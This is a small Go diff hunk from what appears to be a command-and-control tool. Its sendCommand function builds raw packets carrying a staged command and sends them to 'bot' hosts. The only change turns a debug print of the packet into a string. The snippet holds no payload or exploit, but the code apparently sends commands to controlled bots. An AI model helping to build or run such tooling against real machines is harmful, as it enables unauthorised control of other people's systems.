@@ -29,7 +29,7 @@ func sendCommand(iface *net.Interface, src net.IP, listen chan Host) {
 		fd := cattails.NewSocket()
 		// Create packet
 		packet := cattails.CreatePacket(iface, src, bot.IP, bot.Mac, cattails.CreateCommand(stagedCmd))
-		fmt.Println("Packet:", packet)
+		fmt.Println("Packet:", string(packet))
 		fmt.Println("Repsonding to:", bot)
 
 		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
